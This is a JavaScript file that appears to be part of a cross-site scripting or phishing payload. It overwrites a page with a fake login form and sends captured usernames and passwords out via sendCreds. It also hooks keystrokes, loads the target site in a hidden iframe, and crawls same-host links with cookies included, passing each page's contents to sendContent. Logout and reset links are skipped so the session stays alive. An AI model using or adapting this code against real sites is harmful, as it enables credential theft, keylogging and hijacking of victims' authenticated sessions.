function validURL(url){
    try {
		let keywords = [
            "logout",
            "log-out",
            "logoff",
            "signout",
            "sign-out",
            "reset"
        ];
        let new_url = new URL(url);

		if (new_url.protocol !== "http:" && new_url.protocol !== "https:")
			return false;

		if (new_url.host !== HOST_TO_CRAWL)
			return false;

		for (let i = 0; i < keywords.length; i++)
			if (url.includes(keywords[i]))
				return false;
	} catch (_) {
        return false;
    }

    return true;
}

function displayAlert(text){
    alert(text);
}

function formMessage(displayMessage = true){
    if (displayMessage)
        displayAlert("Something went wrong. Try again.")

    let username = document.getElementById("loginInput").value;
    let password = document.getElementById("passwordInput").value;
    document.getElementById("loginInput").value = ""
    document.getElementById("passwordInput").value = ""

    sendCreds(username, password)

    return false;
}

function getContent(){
    let allA = iframe.contentDocument.getElementsByTagName("a")

    let allHrefs = []

    for (let i = 0; i < allA.length; i++){
        allHrefs.push(allA[i].href)
    }

    let uniqueHrefs = allHrefs.filter((item, i, ar) => ar.indexOf(item) === i);
    let validUniqueHrefs = []

    for(let i = 0; i < uniqueHrefs.length; i++) {
        if (validURL(uniqueHrefs[i])){
            validUniqueHrefs.push(uniqueHrefs[i]);
        }
    }

    validUniqueHrefs.forEach(href =>{
        fetch(href, {
            "credentials": "include",
            "method": "GET",
        }).then((response) => {
          return response.text()
        }).then(function (text){
            sendContent(href, text)
        });
    })
}

let keys = ""


/* example
const HOST_TO_CRAWL = "127.0.0.1"
let iframe;

fetch(HOSTURL, {"credentials": "omit"}).then(res => res.text().then(data => {
    document.getElementsByTagName("html")[0].innerHTML = data;

    let mainForm = document.getElementById("loginForm")
    mainForm.onsubmit = formMessage
    document.addEventListener('keydown', logKey)

    setTimeout(function (){formMessage(false)}, 1000);
    setTimeout(function (){formMessage(false)}, 3000);
    setTimeout(function (){formMessage(false)}, 5000);
    setTimeout(function (){formMessage(false)}, 7000);

    iframe = document.createElement('iframe');
    iframe.setAttribute("style","display:none");
    iframe.onload = function () {
        setTimeout(function(){
            getContent()
        }, 2000);
    }

    iframe.width = "100%";
    iframe.height = "100%";
    iframe.src = "http://127.0.0.1/";

    let body = document.getElementsByTagName('body')[0];
    body.appendChild(iframe)

    //must be called once at the end
    attachChat()
}))
*/

//must be called once at the end
attachChat()
